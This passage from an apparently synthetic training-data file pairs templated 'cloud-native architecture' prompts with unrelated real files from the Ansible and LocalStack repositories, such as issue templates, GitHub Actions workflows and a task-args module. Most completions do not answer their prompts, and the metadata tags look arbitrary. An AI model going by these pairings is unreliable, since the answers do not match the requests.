"star_count": 65718, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 128}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import annotations\n\nimport dataclasses\nimport typing as t\n\nfrom collections import abc as c\n\nfrom ansible import constants\nfrom ansible._internal._templating import _engine\nfrom ansible._internal._templating._chain_templar import ChainTemplar\nfrom ansible.errors import AnsibleError\nfrom ansible.module_utils._internal._ambient_context import AmbientContextBase\nfrom ansible.module_utils.datatag import native_type_name\nfrom ansible.parsing import vault as _vault\nfrom ansible.utils.display import Display\n\nif t.TYPE_CHECKING:\n    from ansible.playbook.task import Task\n\n\n@dataclasses.dataclass\nclass TaskContext(AmbientContextBase):\n    \"\"\"Ambient context that wraps task execution on workers. It provides access to the currently executing task.\"\"\"\n\n    task: Task\n\n\nTaskArgsFinalizerCallback = t.Callable[[str, t.Any, _engine.TemplateEngine, t.Any], t.Any]\n\"\"\"Type alias for the shape of the `ActionBase.finalize_task_arg` method.\"\"\"\n\n\nclass TaskArgsChainTemplar(ChainTemplar):\n    \"\"\"\n    A ChainTemplar that carries a user-provided context object, optionally provided by `ActionBase.get_finalize_task_args_context`.\n    TaskArgsFinalizer provides the context to each `ActionBase.finalize_task_arg` call to allow for more complex/stateful customization.\n    \"\"\"\n\n    def __init__(self, *sources: c.Mapping, templar: _engine.TemplateEngine, callback: TaskArgsFinalizerCallback, context: t.Any) -> None:\n        super().__init__(*sources, templar=templar)\n\n        self.callback = callback\n        self.context = context\n\n    def template(self, key: t.Any, value: t.Any) -> t.Any:\n        return self.callback(key, value, self.templar, self.context)\n\n\nclass TaskArgsFinalizer:\n    \"\"\"Invoked during task args finalization; allows actions to override default arg processing (e.g., templating).\"\"\"\n\n    def __init__(self, *args: c.Mapping[str, t.Any] | str | None, templar: _engine.TemplateEngine) -> None:\n        self._args_layers = [arg for arg in args if arg is not None]\n        self._templar = templar\n\n    def finalize(self, callback: TaskArgsFinalizerCallback, context: t.Any) -> dict[str, t.Any]:\n        resolved_layers: list[c.Mapping[str, t.Any]] = []\n\n        for layer in self._args_layers:\n            if isinstance(layer, (str, _vault.EncryptedString)):  # EncryptedString can hide a template\n                if constants.config.get_config_value('INJECT_FACTS_AS_VARS'):\n                    Display().warning(\n                        \"Using a template for task args is unsafe in some situations \"\n                        \"(see https://docs.ansible.com/ansible/devel/reference_appendices/faq.html#argsplat-unsafe).\",\n                        obj=layer,\n                    )\n\n                resolved_layer = self._templar.resolve_to_container(layer, options=_engine.TemplateOptions(value_for_omit={}))\n            else:\n                resolved_layer = layer\n\n            if not isinstance(resolved_layer, dict):\n                raise AnsibleError(f'Task args must resolve to a {native_type_name(dict)!r} not {native_type_name(resolved_layer)!r}.', obj=layer)\n\n            resolved_layers.append(resolved_layer)\n\n        ct = TaskArgsChainTemplar(*reversed(resolved_layers), templar=self._templar, callback=callback, context=context)\n\n        return ct.as_dict()\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "lib/ansible/_internal/_task.py", "language": "python", "complexity": "simple", "star_count": 65718, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 79}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: 🐞 Bug\ndescription: File a bug/issue\ntitle: \"bug: <title>\"\nlabels: [\"type: bug\", \"status: triage needed\"]\nbody:\n- type: markdown\n  attributes:\n    value: |\n      Thanks for taking the time to fill out this bug! If you need real-time help, join us in the [community Slack](https://localstack-community.slack.com).\n- type: checkboxes\n  attributes:\n    label: Is there an existing issue for this?\n    description: Please search to see if an issue already exists for the bug you encountered.\n    options:\n    - label: I have searched the existing issues\n      required: true\n- type: textarea\n  attributes:\n    label: Current Behavior\n    description: A concise description of what you're experiencing.\n  validations:\n    required: true\n- type: textarea\n  attributes:\n    label: Expected Behavior\n    description: A concise description of what you expected to happen.\n  validations:\n    required: false\n- type: dropdown\n  attributes:\n    label: How are you starting LocalStack?\n    options:\n      - With a docker-compose file\n      - With a `docker run` command\n      - With the `localstack` script\n      - Custom (please describe below)\n  validations:\n    required: true\n- type: textarea\n  attributes:\n    label: Steps To Reproduce\n    description: Steps to reproduce the behavior.\n    value: |\n      #### How are you starting localstack (e.g., `bin/localstack` command, arguments, or `docker-compose.yml`)\n\n          docker run localstack/localstack\n\n      #### Client commands (e.g., AWS SDK code snippet, or sequence of \"awslocal\" commands)\n\n          awslocal s3 mb s3://mybucket\n\n  validations:\n    required: true\n- type: textarea\n  attributes:\n    label: Environment\n    description: |\n      examples:\n        - **OS**: Ubuntu 20.04\n        - **LocalStack**:\n          You can find this information in the logs when starting localstack\n\n          LocalStack version: 3.4.1.dev\n          LocalStack Docker image sha: sha256:f02ab8ef73f66b0ab26bb3d24a165e1066a714355f79a42bf8aa1a336d5722e7\n          LocalStack build date: 2024-05-14\n          LocalStack build git hash: ecd7dc879\n\n    value: |\n        - OS:\n        - LocalStack:\n          LocalStack version:\n          LocalStack Docker image sha:\n          LocalStack build date:\n          LocalStack build git hash:\n    render: markdown\n  validations:\n    required: false\n- type: textarea\n  attributes:\n    label: Anything else?\n    description: |\n      Links? References? Anything that will give us more context about the issue you are encountering!\n\n      Tip: You can attach images or log files by clicking this area to highlight it and then dragging files in.\n  validations:\n    required: false\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/ISSUE_TEMPLATE/bug-report.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 87}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "blank_issues_enabled: true\ncontact_links:\n  - name: 📖  LocalStack Documentation\n    url: https://localstack.cloud/docs/getting-started/overview/\n    about: The LocalStack documentation may answer your questions!\n  - name: 💬  LocalStack Community Support (Slack)\n    url: https://localstack.cloud/slack\n    about: Please ask and answer questions here.\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/ISSUE_TEMPLATE/config.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.6000000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 9}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: 'Build Image'\ndescription: 'Composite action which combines all steps necessary to build the LocalStack Community image.'\ninputs:\n  dockerhubPullUsername:\n    description: 'Username to log in to DockerHub to mitigate rate limiting issues with DockerHub.'\n    required: false\n  dockerhubPullToken:\n    description: 'API token to log in to DockerHub to mitigate rate limiting issues with DockerHub.'\n    required: false\n  disableCaching:\n    description: 'Disable Caching'\n    required: false\noutputs:\n  image-artifact-name:\n    description: \"Name of the artifact containing the built docker image\"\n    value: ${{ steps.image-artifact-name.outputs.image-artifact-name }}\nruns:\n  using: \"composite\"\n  # This GH Action requires localstack repo in 'localstack' dir + full git history (fetch-depth: 0)\n  steps:\n    - name: Set up Python\n      uses: actions/setup-python@v5\n      with:\n        python-version-file: 'localstack/.python-version'\n\n    - name: Install docker helper dependencies\n      shell: bash\n      run: pip install --upgrade setuptools setuptools_scm\n\n    - name: Login to Docker Hub\n      # login to DockerHub to avoid rate limiting issues on custom runners\n      uses: docker/login-action@v3\n      if: ${{ inputs.dockerHubPullUsername != '' && inputs.dockerHubPullToken != '' }}\n      with:\n        username: ${{ inputs.dockerhubPullUsername }}\n        password: ${{ inputs.dockerhubPullToken }}\n\n    - name: Build Docker Image\n      id: build-image\n      shell: bash\n      env:\n        DOCKER_BUILD_FLAGS: \"--load ${{ inputs.disableCaching == 'true' && '--no-cache' || '' }}\"\n        PLATFORM: ${{ (runner.arch == 'X64' && 'amd64') || (runner.arch == 'ARM64' && 'arm64') || '' }}\n        DOCKERFILE: ../Dockerfile\n        DOCKER_BUILD_CONTEXT: ..\n        IMAGE_NAME: \"localstack/localstack\"\n      working-directory: localstack/localstack-core\n      run: |\n        ../bin/docker-helper.sh build\n        ../bin/docker-helper.sh save\n\n    - name: Store Docker Image as Artifact\n      uses: actions/upload-artifact@v4\n      with:\n        name: localstack-docker-image-${{ (runner.arch == 'X64' && 'amd64') || (runner.arch == 'ARM64' && 'arm64') || '' }}\n        # the path is defined by the \"save\" command of the docker-helper, which sets a GitHub output \"IMAGE_FILENAME\"\n        path: localstack/localstack-core/${{ steps.build-image.outputs.IMAGE_FILENAME || steps.build-test-image.outputs.IMAGE_FILENAME}}\n        retention-days: 1\n\n    - name: Set image artifact name as output\n      id: image-artifact-name\n      shell: bash\n      run: echo \"image-artifact-name=localstack-docker-image-${{ (runner.arch == 'X64' && 'amd64') || (runner.arch == 'ARM64' && 'arm64') || '' }}\" >> $GITHUB_OUTPUT\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/actions/build-image/action.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 64}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: 'Load Localstack Docker image'\ndescription: 'Composite action that loads a LocalStack Docker image from a tar archive stored in GitHub Workflow Artifacts into the local Docker image cache'\ninputs:\n  platform:\n    required: false\n    description: Target architecture for running the Docker image\n    default: \"amd64\"\nruns:\n  using: \"composite\"\n  steps:\n    - name: Download Docker Image\n      uses: actions/download-artifact@v4\n      with:\n        name: localstack-docker-image-${{ inputs.platform }}\n\n    - name: Set up Python\n      uses: actions/setup-python@v5\n      with:\n        python-version-file: '.python-version'\n        cache: 'pip'\n        cache-dependency-path: 'requirements-typehint.txt'\n\n    - name: Install docker helper dependencies\n      shell: bash\n      run: pip install --upgrade setuptools setuptools_scm\n\n    - name: Load Docker Image\n      shell: bash\n      env:\n        PLATFORM: ${{ inputs.platform }}\n      run: bin/docker-helper.sh load\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/actions/load-localstack-docker-from-artifacts/action.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": true, "line_count": 32}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 🚀 ASF Update Report 🚀\nThis PR has been automatically generated to update the generated API stubs for our ASF services.\nIt uses the latest code-generator from the _main_ branch ([scaffold.py](https://github.com/localstack/localstack/blob/main/localstack/aws/scaffold.py)) and the latest _published_ version of [botocore](https://github.com/boto/botocore) to re-generate all API stubs which are already present in the `localstack.aws.api` module of the _main_ branch.\n\n## 🔄 Updated Services\nThis PR updates the following services:\n{{ SERVICES }}\n\n## 👷🏽 Handle this PR\nThe following options describe how to interact with this PR / the auto-update:\n\n✔️ **Accept Changes**\nIf the changes are satisfying, just squash-merge the PR and delete the source branch.\n\n🚫 **Ignore Changes**\nIf you want to ignore the changes in this PR, just close the PR and *do not delete* the source branch. The PR will not be opened and a new PR will not be created for as long as the generated code does not change (or the branch is deleted). As soon as there are new changes, a new PR will be created.\n\n✏️ **Adapt Changes**\n*Don't do this.* The APIs are auto-generated. If you decide that the APIs should look different, you have to change the code-generation.\n\n⏸️ **Pause Updates**\nRemove the cron-schedule trigger of the GitHub Action workflow which creates these PRs. The action can then still be triggered manually, but it will not be executed automatically.\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/bot_templates/ASF_UPGRADE_PR.md", "language": "markdown", "complexity": "simple", "star_count": 59801, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 23}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "version: 2\nupdates:\n  - package-ecosystem: \"docker\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    ignore:\n      - dependency-name: \"python\"\n        update-types: [\"version-update:semver-major\", \"version-update:semver-minor\"]\n      - dependency-name: \"eclipse-temurin\"\n        update-types: [\"version-update:semver-major\"]\n    labels:\n      - \"area: dependencies\"\n      - \"semver: patch\"\n    groups:\n      docker-base-images:\n        patterns:\n          - \"*\"\n  - package-ecosystem: github-actions\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    labels:\n      - \"area: dependencies\"\n      - \"semver: patch\"\n    groups:\n      github-actions:\n        patterns:\n          - \"*\"\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/dependabot.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 30}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Update ASF APIs\non:\n  schedule:\n    - cron: 0 5 * * MON\n  workflow_dispatch:\n\njobs:\n  update-asf:\n    name: Update ASF APIs\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout Open Source\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Set up system wide dependencies\n        run: |\n          sudo apt-get update\n          sudo apt-get install jq\n\n      - name: Set up Python 3.11\n        id: setup-python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n\n      - name: Install release helper dependencies\n        run: pip install --upgrade setuptools setuptools_scm uv\n\n      - name: Cache LocalStack community dependencies (venv)\n        uses: actions/cache@v4\n        with:\n          path: .venv\n          key: ${{ runner.os }}-python-${{ steps.setup-python.outputs.python-version }}-venv-${{ hashFiles('requirements-dev.txt') }}\n\n      - name: Install dependencies\n        run: make install-dev\n\n      - name: Update botocore (specs)\n        run: |\n          source .venv/bin/activate\n          python3 -m pip install --upgrade botocore\n\n      - name: Update ASF APIs\n        run: |\n          source .venv/bin/activate\n          python3 -m localstack.aws.scaffold upgrade\n\n      - name: Format code\n        run: |\n          source .venv/bin/activate\n          # explicitly perform an unsafe fix to remove unused imports in the generated ASF APIs\n          ruff check --select F401 --unsafe-fixes --fix . --config \"lint.preview = true\"\n          make format-modified\n\n      - name: Check for changes\n        id: check-for-changes\n        run: |\n          # Check if there are changed files and store the result in target/diff-check.log\n          # Check against the PR branch if it exists, otherwise against the main\n          # Store the result in target/diff-check.log and store the diff count in the GitHub Action output \"diff-count\"\n          mkdir -p target\n          (git diff --name-only origin/asf-auto-updates localstack-core/localstack/aws/api/ 2>/dev/null || git diff --name-only origin/main localstack-core/localstack/aws/api/ 2>/dev/null) | tee target/diff-check.log\n          echo \"diff-count=$(cat target/diff-check.log | wc -l)\" >> $GITHUB_OUTPUT\n\n          # Store a (multiline-sanitized) list of changed services (compared to the main) in the GitHub Action output \"changed-services\"\n          echo \"changed-services<<EOF\" >> $GITHUB_OUTPUT\n          echo \"$(git diff --name-only origin/main localstack-core/localstack/aws/api/ | sed 's#localstack-core/localstack/aws/api/#- #g' | sed 's#/__init__.py##g' | sed 's/_/-/g')\" >> $GITHUB_OUTPUT\n          echo \"EOF\" >> $GITHUB_OUTPUT\n\n      - name: Update botocore and transitive pins\n        # only update the pin if we have updates in the ASF code\n        if: ${{ success() && steps.check-for-changes.outputs.diff-count != '0' && steps.check-for-changes.outputs.diff-count != '' }}\n        run: |\n          source .venv/bin/activate\n          # determine botocore version in venv\n          BOTOCORE_VERSION=$(python -c \"import botocore; print(botocore.__version__)\");\n          echo \"Pinning botocore, boto3, and boto3-stubs to version $BOTOCORE_VERSION\"\n          bin/release-helper.sh set-dep-ver botocore \"==$BOTOCORE_VERSION\"\n          bin/release-helper.sh set-dep-ver boto3 \"==$BOTOCORE_VERSION\"\n\n          # determine awscli version that works with $BOTOCORE_VERSION\n          uv venv /tmp/awscli-ver-venv\n          source /tmp/awscli-ver-venv/bin/activate\n          uv pip install \"botocore==$BOTOCORE_VERSION\" awscli\n          export AWSCLI_VERSION=$(uv pip list --format=json | jq -r '.[] | select(.name==\"awscli\") | .version')\n          deactivate\n\n          # pin awscli to that predetermined version\n          source .venv/bin/activate\n          echo \"Pinning awscli to version $AWSCLI_VERSION\"\n          bin/release-helper.sh set-dep-ver awscli \"==$AWSCLI_VERSION\"\n\n          # upgrade the requirements files only for the botocore package\n          pip install pip-tools\n          pip-compile --strip-extras --upgrade-package \"botocore==$BOTOCORE_VERSION\" --upgrade-package \"boto3==$BOTOCORE_VERSION\" --extra base-runtime -o requirements-base-runtime.txt pyproject.toml\n          pip-compile --strip-extras --upgrade-package \"botocore==$BOTOCORE_VERSION\" --upgrade-package \"boto3==$BOTOCORE_VERSION\" --upgrade-package \"awscli==$AWSCLI_VERSION\" --extra runtime -o requirements-runtime.txt pyproject.toml\n          pip-compile --strip-extras --upgrade-package \"botocore==$BOTOCORE_VERSION\" --upgrade-package \"boto3==$BOTOCORE_VERSION\" --upgrade-package \"awscli==$AWSCLI_VERSION\" --extra test -o requirements-test.txt pyproject.toml\n          pip-compile --strip-extras --upgrade-package \"botocore==$BOTOCORE_VERSION\" --upgrade-package \"boto3==$BOTOCORE_VERSION\" --upgrade-package \"awscli==$AWSCLI_VERSION\" --extra dev -o requirements-dev.txt pyproject.toml\n          pip-compile --strip-extras --upgrade-package \"botocore==$BOTOCORE_VERSION\" --upgrade-package \"boto3==$BOTOCORE_VERSION\" --upgrade-package \"awscli==$AWSCLI_VERSION\" --extra typehint -o requirements-typehint.txt pyproject.toml\n\n      - name: Read PR markdown template\n        if: ${{ success() && steps.check-for-changes.outputs.diff-count != '0' && steps.check-for-changes.outputs.diff-count != '' }}\n        id: template\n        uses: juliangruber/read-file-action@v1\n        with:\n          path: .github/bot_templates/ASF_UPGRADE_PR.md\n\n      - name: Add changed services to template\n        if: ${{ success() && steps.check-for-changes.outputs.diff-count != '0' && steps.check-for-changes.outputs.diff-count != '' }}\n        id: markdown\n        uses: mad9000/actions-find-and-replace-string@5\n        with:\n          source: ${{ steps.template.outputs.content }}\n          find: '{{ SERVICES }}'\n          replace: ${{ steps.check-for-changes.outputs.changed-services }}\n\n      - name: Create PR\n        uses: peter-evans/create-pull-request@v7\n        if: ${{ success() && steps.check-for-changes.outputs.diff-count != '0' && steps.check-for-changes.outputs.diff-count != '' }}\n        with:\n          title: \"Update ASF APIs\"\n          body: \"${{ steps.markdown.outputs.value }}\"\n          branch: \"asf-auto-updates\"\n          author: \"LocalStack Bot <localstack-bot@users.noreply.github.com>\"\n          committer: \"LocalStack Bot <localstack-bot@users.noreply.github.com>\"\n          commit-message: \"update generated ASF APIs to latest version\"\n          labels: \"area: asf, area: dependencies, semver: patch\"\n          token: ${{ secrets.PRO_ACCESS_TOKEN }}\n          reviewers: silv-io,alexrashed\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/asf-updates.yml", "language": "yaml", "complexity": "medium", "star_count": 59801, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 132}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: AWS / Build, Test, Push\n\non:\n  schedule:\n    - cron: 0 2 * * MON-FRI\n  push:\n    paths:\n      - '**'\n      - '!.github/**'\n      - '.github/actions/**'\n      - '.github/workflows/aws-main.yml'\n      - '.github/workflows/aws-tests.yml'\n      - '!CODEOWNERS'\n      - '!README.md'\n      - '!.gitignore'\n      - '!.git-blame-ignore-revs'\n      - '!docs/**'\n    branches:\n      - main\n    tags:\n      - 'v[0-9]+.[0-9]+.[0-9]+'\n  pull_request:\n    paths:\n      - '**'\n      - '!.github/**'\n      - '.github/actions/**'\n      - '.github/workflows/aws-main.yml'\n      - '.github/workflows/aws-tests.yml'\n      - '!CODEOWNERS'\n      - '!README.md'\n      - '!.gitignore'\n      - '!.git-blame-ignore-revs'\n      - '!docs/**'\n  workflow_dispatch:\n    inputs:\n      onlyAcceptanceTests:\n        description: 'Only run acceptance tests'\n        required: false\n        type: boolean\n        default: false\n      forceARMTests:\n        description: 'Run the ARM tests'\n        required: false\n        type: boolean\n        default: false\n      enableTestSelection:\n        description: 'Enable Test Selection'\n        required: false\n        type: boolean\n        default: false\n      disableCaching:\n        description: 'Disable Caching'\n        required: false\n        type: boolean\n        default: false\n      PYTEST_LOGLEVEL:\n        type: choice\n        description: Loglevel for PyTest\n        options:\n          - DEBUG\n          - INFO\n          - WARNING\n          - ERROR\n          - CRITICAL\n        default: WARNING\n\nenv:\n  # Docker Image name and default tag used by docker-helper.sh\n  IMAGE_NAME: \"localstack/localstack\"\n  DEFAULT_TAG: \"latest\"\n  PLATFORM_NAME_AMD64: \"amd64\"\n  PLATFORM_NAME_ARM64: \"arm64\"\n\n\njobs:\n  test:\n    name: \"Run integration tests\"\n    uses: ./.github/workflows/aws-tests.yml\n    with:\n      # onlyAcceptance test is either explicitly set, or it's a push event.\n      # otherwise it's false (schedule event, workflow_dispatch event without setting it to true)\n      onlyAcceptanceTests: ${{ inputs.onlyAcceptanceTests == true || github.event_name == 'push' }}\n      # default \"disableCaching\" to `false` if it's a push or schedule event\n      disableCaching: ${{ inputs.disableCaching == true }}\n      # default \"disableTestSelection\" to `true` if it's a push or schedule event\n      disableTestSelection: ${{ (inputs.enableTestSelection != '' && inputs.enableTestSelection) || github.event_name == 'push' }}\n      PYTEST_LOGLEVEL: ${{ inputs.PYTEST_LOGLEVEL }}\n      forceARMTests: ${{ inputs.forceARMTests == true }}\n    secrets:\n      DOCKERHUB_PULL_USERNAME: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n      DOCKERHUB_PULL_TOKEN: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n      TINYBIRD_CI_TOKEN: ${{ secrets.TINYBIRD_CI_TOKEN }}\n\n  report:\n    name: \"Publish coverage and parity metrics\"\n    runs-on: ubuntu-latest\n    needs:\n      - test\n    steps:\n        - name: Checkout\n          uses: actions/checkout@v4\n\n        - name: Set up Python\n          uses: actions/setup-python@v5\n          with:\n            python-version-file: '.python-version'\n            cache: 'pip'\n            cache-dependency-path: 'requirements-dev.txt'\n\n        - name: Install Community Dependencies\n          shell: bash\n          run: make install-dev\n\n        - name: Load all test results\n          uses: actions/download-artifact@v4\n          with:\n            pattern: test-results-*\n            path: target/coverage/\n            merge-multiple: true\n\n        - name: Combine coverage results from acceptance tests\n          run: |\n            source .venv/bin/activate\n            mkdir target/coverage/acceptance\n            cp target/coverage/.coverage.acceptance* target/coverage/acceptance\n            cd target/coverage/acceptance\n            coverage combine\n            mv .coverage ../../../.coverage.acceptance\n\n        - name: Combine all coverage results\n          run: |\n            source .venv/bin/activate\n            cd target/coverage\n            ls -la\n            coverage combine\n            mv .coverage ../../\n\n        - name: Report coverage statistics\n          env:\n            COVERALLS_REPO_TOKEN: ${{ secrets.COVERALLS_REPO_TOKEN }}\n          run: |\n            source .venv/bin/activate\n            coverage report || true\n            coverage html || true\n            coveralls || true\n\n        - name: Create Coverage Diff (Code Coverage)\n          # pycobertura diff will return with exit code 0-3 -> we currently expect 2 (2: the changes worsened the overall coverage),\n          # but we still want cirecleci to continue with the tasks, so we return 0.\n          # From the docs:\n          # Upon exit, the diff command may return various exit codes:\n          #    0: all changes are covered, no new uncovered statements have been introduced\n          #    1: some exception occurred (likely due to inappropriate usage or a bug in pycobertura)\n          #    2: the changes worsened the overall coverage\n          #    3: the changes introduced uncovered statements but the overall coverage is still better than before\n          run: |\n            source .venv/bin/activate\n            pip install pycobertura\n            coverage xml --data-file=.coverage -o all.coverage.report.xml --include=\"localstack-core/localstack/services/*/**\" --omit=\"*/**/__init__.py\"\n            coverage xml --data-file=.coverage.acceptance -o acceptance.coverage.report.xml --include=\"localstack-core/localstack/services/*/**\"  --omit=\"*/**/__init__.py\"\n            pycobertura show --format html acceptance.coverage.report.xml -o coverage-acceptance.html\n            bash -c \"pycobertura diff --format html all.coverage.report.xml acceptance.coverage.report.xml -o coverage-diff.html; if [[ \\$? -eq 1 ]] ; then exit 1 ; else exit 0 ; fi\"\n\n        - name: Create Metric Coverage Diff (API Coverage)\n          env:\n            COVERAGE_DIR_ALL: \"parity_metrics\"\n            COVERAGE_DIR_ACCEPTANCE: \"acceptance_parity_metrics\"\n            OUTPUT_DIR: \"api-coverage\"\n          run: |\n            source .venv/bin/activate\n            mkdir $OUTPUT_DIR\n            python -m scripts.metrics_coverage.diff_metrics_coverage\n\n        - name: Archive coverage and parity metrics\n          uses: actions/upload-artifact@v4\n          with:\n            name: coverage-and-parity-metrics\n            path: |\n              .coverage\n              api-coverage/\n              coverage-acceptance.html\n              coverage-diff.html\n              parity_metrics/\n              acceptance_parity_metrics/\n              scripts/implementation_coverage_aggregated.csv\n              scripts/implementation_coverage_full.csv\n            retention-days: 7\n\n  push:\n    name: \"Push images\"\n    runs-on: ubuntu-latest\n    # push image on main, target branch not set, and the dependent steps were either successful or skipped\n    if: ( github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') ) && !failure() && !cancelled() && github.repository == 'localstack/localstack'\n    needs:\n      # all tests need to be successful for the image to be pushed\n      - test\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Load Localstack ${{ env.PLATFORM_NAME_AMD64 }} Docker Image\n        uses: ./.github/actions/load-localstack-docker-from-artifacts\n        with:\n          platform: ${{ env.PLATFORM_NAME_AMD64 }}\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: us-east-1\n\n      - name: Login to Amazon ECR\n        id: login-ecr\n        uses: aws-actions/amazon-ecr-login@v2\n        with:\n          registry-type: public\n\n      - name: Push ${{ env.PLATFORM_NAME_AMD64 }} Docker Image\n        env:\n          DOCKER_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}\n          DOCKER_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}\n          PLATFORM: ${{ 